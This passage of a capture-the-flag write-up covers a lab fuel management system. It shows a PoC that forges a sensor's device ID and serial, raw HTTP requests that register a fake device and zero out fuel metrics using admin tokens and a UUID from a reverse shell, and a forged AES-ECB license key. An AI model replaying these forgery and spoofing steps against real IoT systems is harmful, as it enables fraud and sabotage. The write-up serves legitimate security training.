<pre><code>[...]\n\nclass DeviceConfiguration(BaseModel):\n    model: str\n    interface: str\n\n    @computed_field(return_type=str)\n    @property\n    def mac(self):\n        return netifaces.ifaddresses(self.interface)[netifaces.AF_LINK][0][\"addr\"]\n\n    @computed_field(return_type=str)\n    @property\n    def ip(self):\n        return netifaces.ifaddresses(self.interface)[netifaces.AF_INET6][0][\"addr\"]\n\n    @computed_field(return_type=str)\n    @property\n    def machine_id(self):\n        return Path(\"/etc/machine-id\").read_text().strip()\n\n    @computed_field(return_type=str)\n    @property\n    def device_id(self):\n        hmac_obj = HMAC.new(self.mac.replace(\":\", \"\").encode(), digestmod=SHA256)\n        hmac_obj.update(self.machine_id.encode())\n        return hmac_obj.hexdigest()\n\n    @computed_field(return_type=str)\n    @property\n    def serial(self):\n        mac = self.mac[8:].replace(\":\", \"\")\n        base_serial = f\"{self.model}{mac[0:2]}-{mac[2:6]}\"\n        checksum = int(base_serial[0:4], 16) - int(base_serial[5:9], 16)\n        if checksum &lt; 0:\n            checksum = checksum * -1\n        return f\"{base_serial}-{checksum}\".lower()\n\n[...]\n\n@http_wrap(error_value=False)\ndef register_device(device: DeviceConfiguration) -&gt; bool:\n    conf = device.model_dump(mode=\"json\", exclude={\"model\", \"interface\"})\n    response = requests.post(\n        f\"{BASE_URL}/register/\",\n        json=conf,\n        verify=False,\n        allow_redirects=False,\n    )\n    if response.status_code == 201:\n        logger.info(\"Device registered successfully\")\n        return True\n    else:\n        logger.error(\n            f\"Device registration failed: {response.status_code} - {response.text}\"\n        )\n        return False\n\n[...]\n</code></pre> <p>The <code>register_device</code> function is giving us all the details we need to craft a <code>POST</code> request to register our own device.</p> <p>Let's take some part of the code to create our own proof-of-concept. The idea of the PoC is to generate the right values for our new device:</p> <ul> <li>The <code>machine_id</code> value is read from a file on the sensor. Since we do not have a real sensor, we just put a random value. The value just needs to respect the specifications.</li> <li>The <code>mac_addr</code> value is the MAC address of the sensor. Again we do not have a real sensor, so we just put a random MAC address.</li> </ul> <p>We are just using the code of the original <code>py</code> file to generate the <code>device_id</code> and the <code>serial</code> fields:</p> <pre><code>from Crypto.Hash import HMAC, SHA256\n\nmachine_id = \"99999999999999999999999999999999\"\nmac_addr = \"00:18:55:ea:62:10\"\n\n# device_id\n\nhmac_obj = HMAC.new(mac_addr.replace(\":\", \"\").encode(), digestmod=SHA256)\nhmac_obj.update(machine_id.encode())\n\n# serial\n\nmac = mac_addr[8:].replace(\":\", \"\")\nbase_serial = f\"e4{mac[0:2]}-{mac[2:6]}\"\nchecksum = int(base_serial[0:4], 16) - int(base_serial[5:9], 16)\nif checksum &lt; 0:\n    checksum = checksum * -1\n\nprint(hmac_obj.hexdigest())\nprint(checksum)\n</code></pre> <p>We ran the PoC:</p> <pre><code>$ python3 poc.py \n59650d62169c4a187f047c084286c3c3f9ba39b71e99b43ca7bbea7cd7c07b51\n33498\n</code></pre> <p>We reused those values for the <code>POST</code> request:</p> <pre><code>POST /api/register/ HTTP/1.1\nHost: dashboard.fms.ctf\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBmbXMuY3RmIiwiYWRtaW4iOnRydWUsImV4cCI6MTc0NzQ5Njk2NH0.aIW3WIKuG2rhPmCWx2T7E2v58R8m4T2wvTuyT-bUwDw\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/json\nContent-Length: 235\n\n{\n  \"device_id\": \"59650d62169c4a187f047c084286c3c3f9ba39b71e99b43ca7bbea7cd7c07b51\",\n  \"serial\": \"e4ea-6210-33498\",\n  \"machine_id\": \"99999999999999999999999999999999\",\n  \"ip\": \"fe80::a471:c9ff:feea:6210\",\n  \"mac\": \"00:18:55:ea:62:10\"\n}\n</code></pre> <p>It worked:</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx\nDate: Sat, 17 May 2025 17:46:26 GMT\nContent-Type: application/json\nContent-Length: 315\nConnection: keep-alive\n\n{\n    \"ip\":\"fe80::a471:c9ff:feea:6210\",\n    \"serial\":\"e4ea-6210-33498\",\n    \"machine_id\":\"99999999999999999999999999999999\",\n    \"last_seen\":\"2025-05-16T13:31:05.016958\",\n    \"device_id\":\"59650d62169c4a187f047c084286c3c3f9ba39b71e99b43ca7bbea7cd7c07b51\",\n    \"mac\":\"00:18:55:ea:62:10\",\n    \"first_seen\":\"2025-05-16T13:31:05.016888\",\n    \"activated\":false\n}\n</code></pre> <p>We found a new device, and a new flag on the user interface:</p> <p></p> <p>Let's send the flag:</p> <pre><code>$ /snap/bin/askgod submit FLAG-2e852a0da786c246475ad34e8ac348c167675be0\nCongratulations, you score your team 2 points!\nMessage: New sensor detected 4/6\n</code></pre> <p>And grab the next hint:</p> <p></p>"},{"location":"write-up/NSEC25_Fuel-Management-System/#where-is-my-license","title":"Where is my license","text":"<p>Now that we have a new sensor, we need to add a license on it to be able to enable it.</p> <p>After trying some value on the license, we got the following errors:</p> Value Error <code>V</code> <code>Value error, non-hexadecimal number found in fromhex() arg at position 0</code> <code>AAAA</code> <code>Value error, Data must be aligned to block boundary in ECB mode</code> <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code> <code>Data not padded</code> <p>We learned that:</p> <ul> <li>It is only hexadecimal</li> <li>The <code>ECB</code> mode is used</li> <li>The data is padded</li> </ul> <p>The request used to create a license key is the following:</p> <pre><code>{\n  \"tenant_id\":\"b66a84fc-d6b7-455f-a010-c558adc6d4a8\",\n  \"license_key\":\"bd04fe25c7eb9bbfd33e8[...]c56ddf59a730e167210552aaf31d31cb1517a8d92ef17\"\n}\n</code></pre> <p>So we can assume that the <code>tenant_id</code> is used to encrypt and decrypt the <code>license_key</code>.</p> <p>After some failures, we are able to decrypt one of the license key with <code>CyberChef</code>:</p> <p></p> <p>Since we are able to decrypt, we should be able to encrypt the data. However for a long time, we were not able to get a proper license key using a decent <code>JSON</code> snippet.</p> <p>We found that adding 10 spaces at our decent <code>JSON</code> snippet is making it decent enough to match a valid license key format:</p> <p></p> <p>Let's add our new license:</p> <p></p> <p>It appear on the user interface with a new flag:</p> <p></p> <p>The hint:</p> <p></p>"},{"location":"write-up/NSEC25_Fuel-Management-System/#kpi-kpi-kpi","title":"KPI KPI KPI","text":"<p>Our understanding was that we have to put the metrics of <code>fuel</code> and <code>consumption</code> at zero for both of the sensors:</p> <p></p> <p>Let's have a look on the <code>update_fuel_consumption</code> function:</p> <pre><code>@http_wrap(error_value=True)\ndef update_fuel_consumption(consumption: int, device: DeviceConfiguration):\n    payload = {\n        \"device_id\": device.device_id,\n        \"sensor_id\": 1,\n        \"sensor_data\": hex(consumption),\n        \"sensor_type\": \"consumption\",\n        \"timestamp\": datetime.now(timezone.utc).isoformat(),\n    }\n    requests.post(\n        f\"{BASE_URL}/metrics/\",\n        json=payload,\n        headers={\"Content-Type\": \"application/json\", \"X-Token\": str(uuid.uuid1())},\n        verify=False,\n    )\n    logger.info(f\"Fuel consumption - updated to {consumption}\")\n</code></pre> <p>So we just need to generate two values:</p> <ul> <li><code>timestamp</code> : We can just reuse the code used in the function</li> <li><code>X-Token</code> : We can generate it directory on the sensor since we have a RCE on it. We can also use the tool we modified for the second flag.</li> </ul> <p>Let's start by the sensor number one.</p> <p>We choose to generate the <code>UUID</code> using the reverse shell:</p> <pre><code>$ python -c \"import uuid; print(str(uuid.uuid1()))\"\n6e15c755-38e4-11f0-8d8b-00185594ec1a\n</code></pre> <p>And we can generate the <code>timestamp</code> on our own computer using this one-liner:</p> <pre><code>$ python3 -c \"from datetime import datetime, timezone; print(datetime.now(timezone.utc).isoformat())\"\n2025-05-24T21:15:44.035058+00:00\n</code></pre> <p>We can now make the <code>POST</code> request on the <code>/api/metrics/</code> API endpoint for the <code>level</code>:</p> <pre><code>POST /api/metrics/ HTTP/1.1\nHost: dashboard.fms.ctf\nCookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBmbXMuY3RmIiwiYWRtaW4iOnRydWUsImV4cCI6MTc0NzUyMjM2Mn0.pF-QSVrCqhbsTTEpPTHgrLZXRETRt095pPlGaLuHxWc\nX-Token: 6e15c755-38e4-11f0-8d8b-00185594ec1a\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0\nAccept: application/json\nContent-Type: application/json\nContent-Length: 215\n\n{\n  \"device_id\": \"c58538930763e67e57f4bc48adf94261659b0cb0375aa11665db12b19371a095\",\n  \"sensor_id\": 1,\n  \"sensor_type\": \"level\",\n  \"sensor_data\": \"0x0000\",\n  \"timestamp\": \"2025-05-24T21:15:44.035058+00:00\"\n}\n</code></pre> <p>It worked:</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx\nDate: Sat, 24 May 2025 21:17:35 GMT\nContent-Type: application/json\nContent-Length: 190\nConnection: keep-alive\n\n{\n    \"sensor_data\":\"0x0000\",\n    \"device_id\":\"c58538930763e67e57f4bc48adf94261659b0cb0375aa11665db12b19371a095\",\n    \"id\":1099,\n    \"timestamp\":\"2025-05-24T21:15:44.035058\",\n    \"sensor_id\":1,\n    \"sensor_type\":\"level\"\n}\n</code></pre> <p>Let's do the same for the <code>consumption</code>:</p> <pre><code>POST /api/metrics/ HTTP/1.1\nHost: dashboard.fms.ctf\nCookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBmbXMuY3RmIiwiYWRtaW4iOnRydWUsImV4cCI6MTc0NzUyMjM2Mn0.pF-QSVrCqhbsTTEpPTHgrLZXRETRt095pPlGaLuHxWc\nX-Token: 6e15c755-38e4-11f0-8d8b-00185594ec1a\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0\nAccept: application/json\nContent-Type: application/json\nContent-Length: 221\n\n{\n  \"device_id\": \"c58538930763e67e57f4bc48adf94261659b0cb0375aa11665db12b19371a095\",\n  \"sensor_id\": 1,\n  \"sensor_type\": \"consumption\",\n  \"sensor_data\": \"0x0000\",\n  \"timestamp\": \"2025-05-24T21:15:44.035058+00:00\"\n}\n</code></pre> <p>It worked too:</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx\nDate: Sat, 24 May 2025 21:17:28 GMT\nContent-Type: application/json\nContent-Length: 196\nConnection: keep-alive\n\n{\"sensor_data\":\"0x0000\",\"device_id\":\"c58538930763e67e57f4bc48adf94261659b0cb0375aa11665db12b19371a095\",\"id\":1098,\"timestamp\":\"2025-05-24T21:15:44.035058\",\"sensor_id\":1,\"sensor_type\":\"consumption\"}\n</code></pre> <p>We did pretty much the same things for the second sensor. And we ot this at the end:</p> <p></p> <p>Final hint:</p> <p></p> <p>Mission accomplished.</p>"}]}